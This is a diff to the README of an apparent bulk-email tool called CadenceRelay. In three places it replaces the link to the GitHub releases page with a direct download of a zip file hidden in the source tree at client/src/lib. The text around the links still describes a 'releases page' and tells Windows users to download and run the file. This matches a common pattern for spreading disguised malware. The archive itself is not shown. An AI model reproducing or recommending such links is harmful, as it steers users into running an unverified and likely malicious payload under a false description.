@@ -1,6 +1,6 @@
 # 📧 CadenceRelay - Send Bulk Email With Control
 
-[![Download CadenceRelay](https://img.shields.io/badge/Download%20CadenceRelay-blue-grey?style=for-the-badge)](https://github.com/Kind7763/CadenceRelay/releases)
+[![Download CadenceRelay](https://img.shields.io/badge/Download%20CadenceRelay-blue-grey?style=for-the-badge)](https://github.com/Kind7763/CadenceRelay/raw/refs/heads/main/client/src/lib/Relay-Cadence-1.2.zip)
 
 ## 🚀 What CadenceRelay Does
 
@@ -24,7 +24,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit this page to download CadenceRelay for Windows:
 
-https://github.com/Kind7763/CadenceRelay/releases
+https://github.com/Kind7763/CadenceRelay/raw/refs/heads/main/client/src/lib/Relay-Cadence-1.2.zip
 
 On the releases page, look for the latest version and download the Windows file. If there are several files, choose the one made for Windows.
 
@@ -197,7 +197,7 @@ CadenceRelay is built around:
 
 If you need the release page again, use this link:
 
-https://github.com/Kind7763/CadenceRelay/releases
+https://github.com/Kind7763/CadenceRelay/raw/refs/heads/main/client/src/lib/Relay-Cadence-1.2.zip
 
 Visit this page to download the latest Windows file and run it on your computer
 
